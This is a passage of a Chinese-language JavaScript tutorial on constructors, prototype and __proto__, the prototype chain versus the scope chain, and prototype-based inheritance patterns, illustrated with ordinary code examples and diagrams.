class="hljs-comment">// 没有 new</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p); <span class="hljs-comment">// undefined（this 会指向全局对象/报错）</span><br></code></pre></td></tr></table></figure><p>（2）防御性编程</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-comment">// 确保构造函数被正确使用</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">new</span>.<span class="hljs-property">target</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(name); <span class="hljs-comment">// 自动补 new</span><br>  &#125;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-实例的-proto-与构造函数的-prototype"><a href="#3-3-实例的-proto-与构造函数的-prototype" class="headerlink" title="3.3 实例的 __proto__ 与构造函数的 prototype"></a>3.3 实例的 <code>__proto__</code> 与构造函数的 <code>prototype</code></h2><p><strong>核心概念对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">prototype</th><th align="left"><code>__proto__</code></th></tr></thead><tbody><tr><td align="left">归属</td><td align="left">函数对象特有</td><td align="left">所有对象都有</td></tr><tr><td align="left">作用</td><td align="left">构造函数创建实例时的原型模板</td><td align="left">对象实际继承的原型对象</td></tr><tr><td align="left">访问方式</td><td align="left">Constructor.prototype</td><td align="left">Object.getPrototypeOf(obj) 或 <code>obj.__proto__</code></td></tr><tr><td align="left">默认值</td><td align="left">自动创建包含 constructor 属性的对象</td><td align="left">取决于对象创建方式</td></tr><tr><td align="left">标准程度</td><td align="left">ES标准属性</td><td align="left">非标准，已由Object.getPrototypeOf()取代</td></tr></tbody></table><p><strong>两者关系图解</strong></p><pre class="mermaid">graph LR    A[构造函数 Constructor] -->|prototype 属性| B[原型对象 Prototype]    C[实例 instance] -->|"__proto__" 链接| B    B -->|constructor 属性| A    B -->|"__proto__"| D[Object.prototype]    D -->|"__proto__"| E[null]</pre><h2 id="3-4-constructor-属性的意义"><a href="#3-4-constructor-属性的意义" class="headerlink" title="3.4 constructor 属性的意义"></a>3.4 <code>constructor</code> 属性的意义</h2><p>constructor 是原型对象上的一个重要属性，它指向创建当前对象的构造函数。</p><p><strong>基本特性</strong></p><p>（1）默认存在于所有函数对象的 prototype 上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（2）实例通过原型链访问</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true（通过原型链访问）</span><br></code></pre></td></tr></table></figure><p><strong>核心作用</strong></p><p>（1）标识对象来源，提供追踪对象是由哪个构造函数创建的路径</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>（2）实现构造函数复用，可以通过 constructor 创建新实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">make</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">make</span> = make;<br>&#125;<br><br><span class="hljs-keyword">const</span> toyota = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&#x27;Toyota&#x27;</span>);<br><span class="hljs-keyword">const</span> honda = <span class="hljs-keyword">new</span> toyota.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;Honda&#x27;</span></span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(honda.<span class="hljs-property">make</span>); <span class="hljs-comment">// &quot;Honda&quot;</span><br></code></pre></td></tr></table></figure><p>（3）类型检查的补充</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkType</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> obj.<span class="hljs-property">constructor</span>.<span class="hljs-property">name</span>;<br>&#125;<br><span class="hljs-title function_">checkType</span>([]); <span class="hljs-comment">// &quot;Array&quot;</span><br></code></pre></td></tr></table></figure><h1 id="第四章：原型链（Prototype-Chain）"><a href="#第四章：原型链（Prototype-Chain）" class="headerlink" title="第四章：原型链（Prototype Chain）"></a>第四章：原型链（Prototype Chain）</h1><h2 id="4-1-原型链的形成机制"><a href="#4-1-原型链的形成机制" class="headerlink" title="4.1 原型链的形成机制"></a>4.1 原型链的形成机制</h2><p>原型链由对象的 <code>__proto__</code> 链接串联而成，形成一条访问属性和方法的查找路径</p><p><strong>原型链核心组件</strong></p><ol><li>实例对象：包含基本数据和 <code>__proto__</code> 链接</li><li>原型对象：包含共享属性和方法</li><li>链式结构：通过 <code>__proto__</code> 逐级链接形成，终点是 null</li></ol><p><strong>具体形成过程</strong></p><p>（1）构造函数创建时的默认设置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-comment">// 自动创建的 prototype 对象</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-comment">/* &#123;</span><br><span class="hljs-comment"> *   constructor: Person,</span><br><span class="hljs-comment"> *   __proto__: Object.prototype</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>(2)实例创建时的原型链建立（<code>new</code> 操作符执行过程）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// 实例的原型指向构造函数的prototype</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(p) === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);             <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 原型对象的constructor指回构造函数</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>);      <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>图解</strong></p><pre class="mermaid">graph LR    A[实例] -->|__proto__| B[构造函数的prototype]    B -->|__proto__| C[Object.prototype]    C -->|__proto__| D[null]</pre><h2 id="4-2-属性查找规则：从实例到原型链顶端"><a href="#4-2-属性查找规则：从实例到原型链顶端" class="headerlink" title="4.2 属性查找规则：从实例到原型链顶端"></a>4.2 属性查找规则：从实例到原型链顶端</h2><p><strong>基本查找流程</strong></p><p>当查找对象属性&#x2F;方法时，JavaScript 引擎会按照以下顺序进行查找</p><ol><li>检查实例自身属性：首先在实例对象自身属性中查找，可使用 <code>hasOwnProperty()</code> 验证属性是否为自有</li><li>沿原型链向上查找：如果实例自身没有该属性，则访问 <code>__proto__</code>，重复此过程直到找到属性或到达原型链终点</li><li>终止条件：找到属性立即返回，或到达 null（原型链中断）时返回 undefined</li></ol><p><strong>图解查找流程</strong></p><pre class="mermaid">graph TD    A[访问 obj.property] --> B{obj有自有属性?}    B -->|是| C[返回该属性值]    B -->|否| D[获取 obj.__proto__]    D --> E{proto为null?}    E -->|是| F[返回undefined]    E -->|否| G[在proto对象上查找property]    G --> H{找到属性?}    H -->|是| I[返回属性值]    H -->|否| D</pre><p><strong>示例代码说明</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// 自有属性</span><br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">// 原型属性</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// 查找过程演示：</span><br>p.<span class="hljs-property">name</span>;    <span class="hljs-comment">// 1. 找到自有属性 → &quot;Alice&quot;</span><br>p.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 2. 自有无 → Person.prototype找到 → 执行方法</span><br>p.<span class="hljs-property">age</span>;     <span class="hljs-comment">// 3. 自有无 → Person.prototype无 → Object.prototype无 → null → undefined</span><br></code></pre></td></tr></table></figure><h2 id="4-3-原型链的终点：Object-prototype-和-null"><a href="#4-3-原型链的终点：Object-prototype-和-null" class="headerlink" title="4.3 原型链的终点：Object.prototype 和 null"></a>4.3 原型链的终点：<code>Object.prototype</code> 和 <code>null</code></h2><p>JavaScript 的原型链最终会指向两个特殊的终点：</p><ol><li>Object.prototype：所有常规对象的最终原型对象</li><li>null：原型链的真正终点，表示“无原型”</li></ol><p><strong>Object.prototype 的作用</strong></p><p>（1）提供基础对象方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 所有对象继承的方法举例</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-title function_">toString</span>();      <span class="hljs-comment">// 继承自Object.prototype</span><br>obj.<span class="hljs-title function_">hasOwnProperty</span>(); <span class="hljs-comment">// 继承自Object.prototype</span><br>obj.<span class="hljs-title function_">valueOf</span>();       <span class="hljs-comment">// 继承自Object.prototype</span><br></code></pre></td></tr></table></figure><p>（2）原型链的枢纽站：基本所有原型链都会经过 Object.prototype（Object.create(null)创建的纯净对象除外）</p><p>（3）内置方法的存储库</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-comment">/* 包含：</span><br><span class="hljs-comment"> * - constructor: Object()</span><br><span class="hljs-comment"> * - toString()</span><br><span class="hljs-comment"> * - valueOf()</span><br><span class="hljs-comment"> * - hasOwnProperty()</span><br><span class="hljs-comment"> * - isPrototypeOf()</span><br><span class="hljs-comment"> * - ...</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p><strong>null 的意义</strong></p><p>（1）原型链的终止标识</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)); <span class="hljs-comment">// null</span><br></code></pre></td></tr></table></figure><p>（2）设计目的：表示“无原型”的最终状态，防止原型链查找进入无限循环</p><p>（3）特殊对象的对比</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> normalObj = &#123;&#125;;<br><span class="hljs-keyword">const</span> bareObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;toString&#x27;</span> <span class="hljs-keyword">in</span> normalObj); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;toString&#x27;</span> <span class="hljs-keyword">in</span> bareObj);   <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="4-4-原型链-vs-作用域链"><a href="#4-4-原型链-vs-作用域链" class="headerlink" title="4.4 原型链 vs 作用域链"></a>4.4 原型链 vs 作用域链</h2><p><strong>作用域链简述</strong></p><p>作用域链是 JavaScript 中实现变量查找的机制，每个函数执行时都会创建一个上下文，其中包含一个作用域链。作用域链由当前函数的活动对象和所有外层函数的变量对象组成，当查找变量时，JavaScript 引擎会从当前执行作用域开始查找，当前作用域未找到时会沿作用域链向上查找，直到找到变量或达到全局作用域返回 undefined</p><p><strong>两者对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">原型链</th><th align="left">作用域链</th></tr></thead><tbody><tr><td align="left">目的</td><td align="left">实现对象间的属性&#x2F;方法的共享和继承</td><td align="left">实现变量的查找和访问</td></tr><tr><td align="left">组成</td><td align="left">对象的 <code>__proto__</code>链接形成</td><td align="left">函数执行上下文中的变量对象链</td></tr><tr><td align="left">查找方向</td><td align="left">从实例对象往原型对象方向查找</td><td align="left">从内层函数往外层函数方向查找</td></tr><tr><td align="left">触发时机</td><td align="left">访问对象属性时</td><td align="left">访问变量时</td></tr><tr><td align="left">终点</td><td align="left">null</td><td align="left">全局执行上下文（window&#x2F;global）</td></tr><tr><td align="left">创建方式</td><td align="left">new、Object.create()或 <code>__proto_</code></td><td align="left">通过函数定义和调用</td></tr></tbody></table><p><strong>代码示例</strong></p><p>（1）原型链查找</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;John&#x27;</span>);<br><br><span class="hljs-comment">// 原型链查找过程:</span><br><span class="hljs-comment">// 1. john 自身有 name 属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">name</span>); <span class="hljs-comment">// 直接找到</span><br><br><span class="hljs-comment">// 2. john 自身没有 sayHello 方法，查找原型链</span><br>john.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 在 Person.prototype 上找到</span><br><br><span class="hljs-comment">// 3. toString 方法查找</span><br><span class="hljs-comment">// john -&gt; Person.prototype -&gt; Object.prototype -&gt; null</span><br>john.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// 最终在 Object.prototype 上找到</span><br></code></pre></td></tr></table></figure><p>（2）作用域链查找</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> globalVar = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> outerVar = <span class="hljs-string">&#x27;outer&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> innerVar = <span class="hljs-string">&#x27;inner&#x27;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerVar);    <span class="hljs-comment">// 当前作用域找到</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar);    <span class="hljs-comment">// 外层作用域找到</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar);   <span class="hljs-comment">// 全局作用域找到</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(notDefined);  <span class="hljs-comment">// 报错，所有作用域都找不到</span><br>  &#125;<br>  <br>  <span class="hljs-title function_">inner</span>();<br>&#125;<br><br><span class="hljs-title function_">outer</span>();<br></code></pre></td></tr></table></figure><h1 id="第五章：继承与原型链"><a href="#第五章：继承与原型链" class="headerlink" title="第五章：继承与原型链"></a>第五章：继承与原型链</h1><h2 id="5-1-基于原型的继承实现（Object-create）"><a href="#5-1-基于原型的继承实现（Object-create）" class="headerlink" title="5.1 基于原型的继承实现（Object.create）"></a>5.1 基于原型的继承实现（Object.create）</h2><p><strong>代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> animal = &#123;<br>  <span class="hljs-attr">init</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;,<br>  <span class="hljs-attr">getName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> dog = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(animal);<br>dog.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>&#125;;<br><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(dog);<br>myDog.<span class="hljs-title function_">init</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">bark</span>());    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>特点</strong></p><ul><li>更纯粹的原型继承，不需要构造函数</li><li>适合简单对象继承场景</li><li>无法实现私有属性和方法</li></ul><h2 id="5-2-组合继承（构造函数-原型链）"><a href="#5-2-组合继承（构造函数-原型链）" class="headerlink" title="5.2 组合继承（构造函数 + 原型链）"></a>5.2 组合继承（构造函数 + 原型链）</h2><p><strong>代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 父类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span> = [<span class="hljs-string">&#x27;black&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>];<br>&#125;<br><br><span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>&#125;;<br><br><span class="hljs-comment">// 子类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name); <span class="hljs-comment">// 调用父类构造函数，继承实例属性</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-comment">// 设置原型链继承</span><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>; <span class="hljs-comment">// 修复构造函数指向</span><br><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> dog1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>, <span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-title function_">bark</span>());   <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>关键点分析</strong></p><ul><li>Animal.call(this, name) 实现实例属性的继承（类似其他语言的 super()）</li><li>Object.create(Animal.prototype) 创建以父类原型为原型的新对象，避免直接赋值导致原型污染</li><li>修复 constructor 属性保证对象类型正确识别</li></ul><h2 id="5-3-寄生组合继承（优化方案）"><a href="#5-3-寄生组合继承（优化方案）" class="headerlink" title="5.3 寄生组合继承（优化方案）"></a>5.3 寄生组合继承（优化方案）</h2><p><strong>代码实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inheritPrototype</span>(<span class="hljs-params">child, parent</span>) &#123;<br>  <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br>  prototype.<span class="hljs-property">constructor</span> = child;<br>  child.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = prototype;<br>&#125;<br><br><span class="hljs-comment">// 父类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-comment">// 子类</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, breed</span>) &#123;<br>  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = 